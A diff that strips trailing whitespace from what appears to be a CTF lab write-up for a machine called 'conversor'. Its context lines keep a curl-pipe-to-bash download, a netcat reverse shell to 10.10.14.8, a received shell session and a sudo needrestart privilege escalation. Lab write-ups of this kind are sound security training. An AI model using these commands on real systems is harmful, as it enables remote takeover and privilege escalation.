@@ -87,7 +87,7 @@ os.system("curl 10.10.14.8/shell.sh|bash")
 This payload will store our exploit.py on the directory, and we will get a callback on our machine, where we will keep a reverse shell payload.
 
 ```bash
-kali@kali:cat shell.sh                                                                                                                                           
+kali@kali:cat shell.sh
 #!/bin/bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
 ```
@@ -95,7 +95,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
 Now, start a python server and a listener.
 
 ```bash
-kali@kali:python3 -m http.server 80                                                                                                                                
+kali@kali:python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
@@ -108,7 +108,7 @@ kali@kali:penelope -p 4444
 And upload the exploit payload we created, and let the cron job do the work.
 
 ```bash
-kali@kali:python3 -m http.server 80                                                                                                                                
+kali@kali:python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.238.31 - - [18/Mar/2026 08:51:15] "GET /shell.sh HTTP/1.1" 200 -
 ```
@@ -120,9 +120,9 @@ kali@kali:penelope -p 4444
 [+] Got reverse shell from conversor~10.129.238.31-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/conversor~10.129.238.31-Linux-x86_64/2026_03_18-08_51_18-513.log 📜
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@conversor:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -206,7 +206,7 @@ The exploit can be found here "*https://github.com/pentestfunctions/CVE-2024-489
 But the machine doesn't have gcc, so we will have to compile it first on our machine.
 
 ```bash
-kali@kali:cat exploit.c                                                                                                                                            
+kali@kali:cat exploit.c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -272,8 +272,8 @@ Now, login from another terminal and run the sudo command.
 
 ```bash
 fismathack@conversor:~$ sudo /usr/sbin/needrestart
-Scanning processes...                                                                                                                                        
-Scanning linux images...                                                                                                                                     
+Scanning processes...
+Scanning linux images...
 
 Running kernel seems to be up-to-date.
 
